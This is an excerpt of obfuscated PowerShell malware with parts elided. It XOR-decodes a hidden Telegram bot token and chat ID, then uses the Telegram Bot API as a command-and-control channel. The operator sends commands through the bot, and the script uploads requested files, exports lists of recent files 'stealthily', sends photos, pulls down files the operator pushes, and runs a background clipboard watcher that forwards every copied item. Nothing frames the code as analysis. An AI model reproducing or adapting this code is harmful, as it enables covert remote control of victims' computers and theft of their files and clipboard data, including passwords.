...
$c17dc46b730773292999e7e533184ca2 = "AAwNBlYAAgIGAAh2InNMDQBLIQwnbQopBwdPcg5ieyZ5CFpDVmYcdCgPeB45YA==";
$s9gjk4j66j5u3k789k246 = "AQMMDFYCAwEEBA==";
$78ger63590kjh76jhnmlp089jl7h7 = "X0FNRRANHx1WQVsZF1FaAFRDAlRNWkAFSgBZTQ8NAFACUQsGUgdccyNxQwxST3ZRfWsNL1BSTXICbntzfllaFFYyQn8uXHZPbmw="

$2e5d0d722230747e31d6fc555d2bbfdc = "7595c7027127c46e31c9c52beb69844c7f96c6f2b69da54d935d27494846079acb89de7569ce8b9f6a42769602f9ef10881e2d3145b462f0add714b45b87678f"

function A1539896954_a08adfbc1fb8b8040f2f0 {
    param (
        [string]$0e1c871b1d9d00aaca64cb31c41bcc28w,
        [string]$0e1c871b1d9d00adaca64cb31c41bcc28w
    )

    $0e1c871c1d9d00adaca64cb31c41bcc28w = [Convert]::FromBase64String($0e1c871b1d9d00aaca64cb31c41bcc28w)
    $0e1c871b1d9d00adaca64cb31c41bcc28wBytes = [System.Text.Encoding]::UTF8.GetBytes($0e1c871b1d9d00adaca64cb31c41bcc28w)

    for ($i = 0; $i -lt $0e1c871c1d9d00adaca64cb31c41bcc28w.Length; $i++) {
        $0e1c871c1d9d00adaca64cb31c41bcc28w[$i] = $0e1c871c1d9d00adaca64cb31c41bcc28w[$i] -bxor $0e1c871b1d9d00adaca64cb31c41bcc28wBytes[$i % $0e1c871b1d9d00adaca64cb31c41bcc28wBytes.Length]
    }

    return [System.Text.Encoding]::UTF8.GetString($0e1c871c1d9d00adaca64cb31c41bcc28w)
}

$c17dc46b730773292999e7e533184ca2 = A1539896954_a08adfbc1fb8b8040f2f0 $c17dc46b730773292999e7e533184ca2 $2e5d0d722230747e31d6fc555d2bbfdc
$s9gjk4j66j5u3k789k246 = A1539896954_a08adfbc1fb8b8040f2f0 $s9gjk4j66j5u3k789k246 $2e5d0d722230747e31d6fc555d2bbfdc
$78ger63590kjh76jhnmlp089jl7h7 = A1539896954_a08adfbc1fb8b8040f2f0 $78ger63590kjh76jhnmlp089jl7h7 $2e5d0d722230747e31d6fc555d2bbfdc
...
"@
    ...
    $body = @{
        chat_id = $s9gjk4j66j5u3k789k246
        text    = $info
    }
    Invoke-RestMethod -Uri "$78ger63590kjh76jhnmlp089jl7h7/sendMessage" -Method Post -Body $body -UseBasicParsing
...
function Send-Message {
    param (
        [string]$Message,
        [string]$c17dc46b730773292999e7e533184ca2 = $c17dc46b730773292999e7e533184ca2,
        [string]$s9gjk4j66j5u3k789k246 = $s9gjk4j66j5u3k789k246,
    ...
    try {
        while ($currentPos -lt $Message.Length) {
            ...
            Invoke-RestMethod `
                -Uri "https://api.telegram.org/bot$c17dc46b730773292999e7e533184ca2/sendMessage" `
                -Method Post `
                -Body $body `
...
function Start-ClipWatch {
    param($c17dc46b730773292999e7e533184ca2, $s9gjk4j66j5u3k789k246)
        ...
        while ($true) {
            try {
                ...
                if ($clip -and $clip -ne $prev -and !$sent.ContainsKey($clip)) {
                    ...
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$c17dc46b730773292999e7e533184ca2/sendMessage" -Method POST -Body $body -UseBasicParsing
                }
            } catch {}
    ...
    $ps.AddScript($script).AddArgument($c17dc46b730773292999e7e533184ca2).AddArgument($s9gjk4j66j5u3k789k246) | Out-Null
    $ps.BeginInvoke()
...
function Send-TelegramFile {
    ...
    try {
        ...
        Invoke-WebRequest `
            -Uri "https://api.telegram.org/bot$c17dc46b730773292999e7e533184ca2/sendDocument" `
            -Method Post `
            -Body $allBytes `
            -Headers $headers `
            -UseBasicParsing
...
function Send-TelegramPhoto {
    ...
    try {
        ...
        Invoke-WebRequest `
            -Uri "https://api.telegram.org/bot$c17dc46b730773292999e7e533184ca2/sendPhoto" `
            -Method Post `
            -Body $allBytes `
            -Headers $headers `
            -UseBasicParsing
...
function Export-RecentFilesStealth {
    ...
    Send-TelegramFile $txt $c17dc46b730773292999e7e533184ca2 $s9gjk4j66j5u3k789k246
    Send-TelegramFile $csv $c17dc46b730773292999e7e533184ca2 $s9gjk4j66j5u3k789k246
...
function Send-MultiFiles {
    ...
    foreach ($path in $Paths) {
        if (Test-Path $path) {
            Send-TelegramFile -Path $path -Token $c17dc46b730773292999e7e533184ca2 -ChatId $s9gjk4j66j5u3k789k246
...
function Send-TelegramFileAsync {
    param (
        [string]$FilePath,
        [string]$c17dc46b730773292999e7e533184ca2 = $global:token,
        [string]$s9gjk4j66j5u3k789k246 = $global:chatid,
    ...
    $url = "https://api.telegram.org/bot$c17dc46b730773292999e7e533184ca2/sendDocument"
    ...
    $args = @(
        "-s"
        "-F", "chat_id=$s9gjk4j66j5u3k789k246"
        "-F", "caption=$Caption"
...
try {
    ...
    $clearResp = Invoke-RestMethod -Uri "$78ger63590kjh76jhnmlp089jl7h7/getUpdates?timeout=1" -UseBasicParsing
...
while ($true) {
    try {
        $url = "$78ger63590kjh76jhnmlp089jl7h7/getUpdates?offset=$lastUpdateId&timeout=30"
        ...
        foreach ($update in $resp.result) {
            ...
            if (-not $text) {
                if ($msg.PSObject.Properties['document'] -or $msg.PSObject.Properties['photo']) {
                    try {
                        ...
                        $fileInfo = Invoke-RestMethod -Uri "$78ger63590kjh76jhnmlp089jl7h7/getFile?file_id=$fileId" -UseBasicParsing
                        $filePath = $fileInfo.result.file_path
            
                        $downloadUrl = "https://api.telegram.org/file/bot$c17dc46b730773292999e7e533184ca2/$filePath"
            ...
            elseif ($text -like "getfilem *") {
                ...
                try {
                    Send-MultiFiles -Paths $filePaths -Token $c17dc46b730773292999e7e533184ca2 -ChatId $s9gjk4j66j5u3k789k246
                }
                catch {
                    Send-ErrMessage "❌ Gagal mengirim file:`n$_"
                }
            ...
            elseif ($text -eq "start-clipwatch") {
                Start-ClipWatch -Token $c17dc46b730773292999e7e533184ca2 -ChatId $s9gjk4j66j5u3k789k246
            }
